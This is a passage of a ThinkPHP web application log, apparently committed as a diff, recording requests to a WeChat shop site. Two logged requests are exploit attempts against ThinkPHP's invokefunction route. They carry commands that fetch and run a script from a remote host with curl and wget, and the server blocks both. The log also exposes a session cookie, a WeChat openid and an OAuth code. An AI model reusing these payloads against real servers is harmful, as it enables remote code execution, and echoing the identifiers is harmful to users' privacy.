+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2007J17C Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/7811 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 3157,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T21:50:04+08:00 ] 172.17.142.12 68.183.144.6 GET /
+[ info ] 39.106.3.107/ [运行时间：0.017886s][吞吐率：55.91req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:32:29+08:00 ] 172.17.142.12 109.237.97.141 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh [运行时间：0.019448s][吞吐率：51.42req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'curl 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T22:32:42+08:00 ] 172.17.142.12 109.237.97.141 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh [运行时间：0.018269s][吞吐率：54.74req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget -q -O - 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T22:56:57+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/register?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html%23%2F%3Findex%3D3
+[ info ] www.jiajiazxgg.com/index.php/handle/index/register?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html%23%2F%3Findex%3D3 [运行时间：0.076338s][吞吐率：13.10req/s] [内存消耗：1,840.68kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'register',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => 'http://www.jiajiazxgg.com/index.html#/?index=3',
+)
+[ info ] [ RUN ] app\handle\controller\Index->register[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:56:57+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/category?id=1
+[ info ] www.jiajiazxgg.com/index.php/handle/index/category?id=1 [运行时间：0.063936s][吞吐率：15.64req/s] [内存消耗：2,522.12kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'category',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '1',
+)
+[ info ] [ RUN ] app\handle\controller\Index->category[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:56:57+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member?openid=0
+[ info ] www.jiajiazxgg.com/index.php/handle/member?openid=0 [运行时间：0.087270s][吞吐率：11.46req/s] [内存消耗：2,701.88kb] [文件加载：54]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => '0',
+)
+[ info ] [ RUN ] app\handle\controller\Member->index[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [8]未定义数组索引: collage_count[/www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php:46]
+---------------------------------------------------------------
+[ 2023-02-12T22:56:58+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/jsConfig?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html
+[ info ] www.jiajiazxgg.com/index.php/handle/index/jsConfig?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html [运行时间：0.208187s][吞吐率：4.80req/s] [内存消耗：2,589.91kb] [文件加载：54]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'jsConfig',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => 'http://www.jiajiazxgg.com/index.html',
+)
+[ info ] [ RUN ] app\handle\controller\Index->jsConfig[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [8]未定义数组索引: access_token[/www/wwwroot/www.jiajiazxgg.com/webapp/handle/common.php:15]
+---------------------------------------------------------------
+[ 2023-02-12T22:56:59+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/register?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html%23%2F%3Findex%3D3&code=061MIa000ec3rP1AZ0200iGj400MIa0n&state=
+[ info ] www.jiajiazxgg.com/index.php/handle/index/register?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html%23%2F%3Findex%3D3&code=061MIa000ec3rP1AZ0200iGj400MIa0n&state= [运行时间：0.550607s][吞吐率：1.82req/s] [内存消耗：2,558.95kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'register',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'x-requested-with' => 'com.tencent.mm',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => 'http://www.jiajiazxgg.com/index.html#/?index=3',
+  'code' => '061MIa000ec3rP1AZ0200iGj400MIa0n',
+  'state' => '',
+)
+[ info ] [ RUN ] app\handle\controller\Index->register[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/category?id=1
+[ info ] www.jiajiazxgg.com/index.php/handle/index/category?id=1 [运行时间：0.071944s][吞吐率：13.90req/s] [内存消耗：2,522.27kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'category',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '1',
+)
+[ info ] [ RUN ] app\handle\controller\Index->category[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/member?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.106415s][吞吐率：9.40req/s] [内存消耗：2,641.20kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Member->index[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/cart?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/cart?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.078617s][吞吐率：12.72req/s] [内存消耗：2,463.99kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'cart',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Cart->index[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Cart.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/member?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.037777s][吞吐率：26.47req/s] [内存消耗：2,641.20kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Member->index[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index?id=0
+[ info ] www.jiajiazxgg.com/index.php/handle/index?id=0 [运行时间：0.055941s][吞吐率：17.88req/s] [内存消耗：2,578.48kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '0',
+)
+[ info ] [ RUN ] app\handle\controller\Index->index[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/jsConfig?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html
+[ info ] www.jiajiazxgg.com/index.php/handle/index/jsConfig?url=http:%2F%2Fwww.jiajiazxgg.com%2Findex.html [运行时间：0.230740s][吞吐率：4.33req/s] [内存消耗：2,590.06kb] [文件加载：54]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'jsConfig',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => 'http://www.jiajiazxgg.com/index.html',
+)
+[ info ] [ RUN ] app\handle\controller\Index->jsConfig[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [8]未定义数组索引: access_token[/www/wwwroot/www.jiajiazxgg.com/webapp/handle/common.php:15]
+---------------------------------------------------------------
+[ 2023-02-12T22:57:00+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/index/collage_tips?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/index/collage_tips?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.043656s][吞吐率：22.91req/s] [内存消耗：2,528.72kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'index',
+    2 => 'collage_tips',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
